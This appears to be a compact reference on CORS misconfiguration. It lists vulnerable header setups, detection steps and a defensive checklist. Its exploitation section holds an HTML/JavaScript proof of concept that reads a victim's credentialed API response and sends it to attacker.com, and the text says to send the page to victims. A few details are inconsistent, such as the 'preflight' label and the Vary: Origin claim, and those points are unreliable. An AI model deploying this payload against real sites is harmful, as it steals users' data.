# CORS Misconfiguration: 2026 Reference

## Vulnerable Configurations

### Origin Reflection
```http
Access-Control-Allow-Origin: https://attacker.com
Access-Control-Allow-Credentials: true
```
Server reads `Origin` header and echoes it back — ANY origin allowed with credentials.

### Wildcard Origin (No Credentials)
```http
Access-Control-Allow-Origin: *
```
Cannot send cookies, but useful for:
- Internal network scanning via CORS (XS-Leaks)
- Cache poisoning if combined with Vary: Origin

### Null Origin Bypass
```http
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```
Triggered by:
- `sandboxed` iframe
- `data:` URL
- `file://` protocol

## Exploitation

### Preflight CORS Attack
```html
<!DOCTYPE html>
<script>
fetch('https://target.com/api/sensitive', {
  credentials: 'include'
}).then(r => r.text()).then(d => location='https://attacker.com/?d='+btoa(d))
</script>
```
Host this on attacker server, send link to victim. Works when Origin is echoed and credentials allowed.

### XS-Leak via CORS
- Check if API endpoint exists by observing error vs success
- Determine object ownership by response content
- Enumerate valid user IDs without auth

## Detection
1. Check ALL `Access-Control-Allow-*` headers
2. Send request with arbitrary `Origin:` header
3. Check preflight (`OPTIONS`) response
4. Look for `null` origin in allowlist
5. Test both credentialed and non-credentialed requests
6. Check subdomains for more permissive CORS policies

## Defensive Checklist
1. Never echo Origin header — use static allowlist
2. Never use `Access-Control-Allow-Origin: *` with credentials
3. Never include `Access-Control-Allow-Origin: null`
4. Use `Vary: Origin` to prevent cache poisoning
5. Restrict `Access-Control-Allow-Methods` to required methods
6. Use short `Access-Control-Max-Age` for preflight